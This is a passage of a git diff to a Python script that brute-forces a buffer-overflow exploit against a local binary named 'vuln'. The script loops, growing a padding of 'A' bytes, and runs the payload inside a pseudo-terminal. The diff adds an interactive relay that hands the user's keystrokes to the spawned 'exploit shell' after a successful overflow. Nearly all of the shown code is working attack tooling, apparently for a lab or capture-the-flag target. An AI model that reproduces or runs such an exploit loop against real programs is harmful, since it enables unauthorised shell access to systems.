@@ -66,19 +66,12 @@ while True:
         exploit_command = "cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"
         i = 0
         while True:
-            print(i)
+            print(f"i: {i}")
             i += 1
 
             master_fd, slave_fd = pty.openpty()
 
             exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
-            print(f"Subprocess PID: {exploit_proc.pid}")
-
-            #check if vuln is blocked while expecting input (select -> non blocking)
-            # _, wlist, _ = select.select([], [master_fd], [])
-
-            # if master_fd in wlist:       #must know the form of input. Is it arguments? Or stdin? Or socket? ect
-            #     print("sending the payload")
             os.write(master_fd, b'\n')
 
             while True:
@@ -86,97 +79,51 @@ while True:
                     status = exploit_proc.poll()        #why is the status still None after segmentation fault??
                     # print(f"process status: {status}")
 
-
-                    # Check if there is output from the process (master_fd)
                     if master_fd in rlist:
                         try:
                             output = os.read(master_fd, 100000)
                             if output:
                                 # os.write(1, output)  # Write the process output to stdout (1)
-                                if b'Segmentation fault' in output:
+                                if b'Segmentation fault' in output:           #must change, must retrieve the exit code of the process (139)
                                     exploit_proc.terminate()
                                     break
 
                             else:
                                 break  # Process has exited
                         except OSError:
-                            break  # Handle OS errors
+                            break
 
-                    # Check if there is user input (0 represents stdin)
-                    # if 0 in rlist:
-                    #     print("2")
+                    if 0 in rlist:
+                        #exploit took place successfully
+                        while True:
+                            user_input = os.read(0, 5000)
+                            
+                            if b'exit' in user_input:
+                                    exploit_proc.terminate()
+                                    os.close(master_fd)
+                                    os.close(slave_fd)
+                                    os.remove("trash")
+                                    os.remove("vuln_payload")
+                                    sys.exit(1)
+                            
+                            os.write(master_fd, user_input)  # Forward user input to the exploit shell
+                            rlist_response, _, _ = select.select([master_fd], [], [])
 
-                    #     try:
-                    #         user_input = os.read(0, 1024)
-                    #         if user_input:
-                    #             os.write(master_fd, user_input)  # Forward user input to the process
-                    #         else:
-                    #             break  # EOF from user input
-                    #     except OSError:
-                    #         break  # Handle OS errors
+                            while master_fd in rlist_response:
+                                response = os.read(master_fd, 1024)
+                                response = response.replace(b'\r', b'')
+                                if response != user_input:
+                                    os.write(1, response)
+                                    break
 
-                # Close the PTY file descriptors
+                                rlist_response, _, _ = select.select([master_fd], [], [])
 
-            
+            # Close the PTY file descriptors
             os.close(master_fd)
             os.close(slave_fd)
-
-
-            # while True:
-            #     status = exploit_proc.poll()
-            #     if status is None:
-            #         print("Subprocess is still running.")
-
-            #         _, wlist1, _ = select.select([], [master_fd], [])
-            #         if master_fd in wlist1:
-            #             print("exploit has probably succeeded??")
-
-            #             rlist, _, _ = select.select([master_fd, 0], [], [])
-
-            #             if master_fd in rlist:
-            #                 print("here1")
-            #                 try:
-            #                     output = os.read(master_fd, 1024)
-            #                     if output:
-            #                         os.write(1, output) 
-            #                     else:
-            #                         break 
-            #                 except OSError:
-            #                     print("e1")
-            #                     break     
-
-            #             if 0 in rlist:
-            #                 print("here2")
-
-            #                 try:
-            #                     user_input = os.read(0, 1024)
-            #                     if user_input:
-            #                         os.write(master_fd, user_input)  
-            #                     else:
-            #                         break
-            #                 except OSError:
-            #                     print("e2")
-            #                     break
-            #         else:
-            #             print("??")
-            #             continue
-            #         break
-            #     else:
-            #         print(f"Subprocess has finished with exit code {status}.")
-            #     break
-
-            
-
-
-            # if(exploit_proc.returncode != 139):
-            #     # print(f"exploit proc return code: {exploit_proc.returncode}")
-            #     break
-
         
-        break
     else:
         overflow += b'A'
 
-os.remove("trash")
-os.remove("vuln_payload")
+
 
